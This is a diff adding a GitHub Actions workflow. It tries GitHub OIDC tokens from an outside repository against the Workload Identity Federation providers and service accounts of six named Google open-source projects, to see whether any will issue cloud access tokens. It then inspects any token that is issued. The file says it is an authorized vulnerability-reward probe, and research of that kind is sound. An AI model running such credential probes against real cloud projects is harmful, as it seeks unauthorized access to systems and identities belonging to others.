@@ -1,0 +1,91 @@
+name: lane5-wif-matrix
+# Authorized Google Cloud VRP lane probe: does each public WIF provider used by a
+# Google OSS repo accept a GitHub OIDC token from pwnhaven-afk/wif-probe?
+# Read-only: we only request a token and inspect tokeninfo on success. We never
+# call any Google API with a successfully minted credential beyond tokeninfo.
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        include:
+          - name: genmedia
+            provider: projects/64774088793/locations/global/workloadIdentityPools/github-41c4d893/providers/gh-41c4d893
+            sa: gemini-cli-41c4d893@ghchinoy-genai-sa.iam.gserviceaccount.com
+          - name: microservices-demo
+            provider: projects/816257685787/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider
+            sa: github-action-runner@online-boutique-ci.iam.gserviceaccount.com
+          - name: nodejs-docs-custard
+            provider: projects/1046198160504/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider
+            sa: kokoro-system-test@long-door-651.iam.gserviceaccount.com
+          - name: nodejs-docs-iamdeny
+            provider: projects/949737848314/locations/global/workloadIdentityPools/iam-deny-test-pool/providers/iam-deny-test-provider
+            sa: kokoro-ca@isakovf-iam-deny-samples.iam.gserviceaccount.com
+          - name: cloud-cpp
+            provider: projects/49427430084/locations/global/workloadIdentityPools/github-wif-pool/providers/github-wif-provider
+            sa: github-actions@cloud-cpp-identity-federation.iam.gserviceaccount.com
+          - name: knowledge-catalog-direct
+            provider: projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github
+            direct: true
+    steps:
+      - name: OIDC token claims for audience ${{ matrix.name }}
+        run: |
+          set -euo pipefail
+          AUD="https://iam.googleapis.com/${{ matrix.provider }}"
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value)
+          echo "OIDC_TOKEN_LEN=${#TOKEN}"
+          python3 - "$TOKEN" <<'PY'
+          import base64,json,sys
+          t=sys.argv[1].split('.')[1]; t+='='*(-len(t)%4)
+          c=json.loads(base64.urlsafe_b64decode(t))
+          print('CLAIMS:', json.dumps({k:c.get(k) for k in ('iss','aud','sub','repository','repository_owner','ref','workflow','event_name')}, indent=1))
+          PY
+
+      - name: Service-account impersonation probe (access_token) ${{ matrix.name }}
+        if: ${{ !matrix.direct }}
+        id: sa_probe
+        continue-on-error: true
+        uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 # v3
+        with:
+          create_credentials_file: false
+          export_environment_variables: false
+          workload_identity_provider: ${{ matrix.provider }}
+          service_account: ${{ matrix.sa }}
+          token_format: access_token
+          access_token_scopes: https://www.googleapis.com/auth/cloud-platform
+
+      - name: Report SA probe outcome ${{ matrix.name }}
+        run: |
+          echo "PROBE=${{ matrix.name }} SA_OUTCOME=${{ steps.sa_probe.outcome }}"
+          if [ "${{ steps.sa_probe.outcome }}" = "success" ]; then
+            TOKEN="${{ steps.sa_probe.outputs.access_token }}"
+            echo "SA_TOKEN_ISSUED len=${#TOKEN}"
+            curl -s -o /tmp/ti.json -w "tokeninfo_http=%{http_code}\n" "https://oauth2.googleapis.com/tokeninfo?access_token=${TOKEN}" || true
+            head -c 500 /tmp/ti.json; echo
+          fi
+
+      - name: Direct-WIF probe (no service account) ${{ matrix.name }}
+        if: ${{ matrix.direct }}
+        id: direct_probe
+        continue-on-error: true
+        uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 # v3
+        with:
+          create_credentials_file: false
+          export_environment_variables: false
+          workload_identity_provider: ${{ matrix.provider }}
+          token_format: ''
+
+      - name: Report direct probe outcome ${{ matrix.name }}
+        run: |
+          echo "PROBE=${{ matrix.name }} DIRECT_OUTCOME=${{ steps.direct_probe.outcome }}"
+          if [ "${{ steps.direct_probe.outcome }}" = "success" ]; then
+            echo "DIRECT_TOKEN_ISSUED"
+          fi
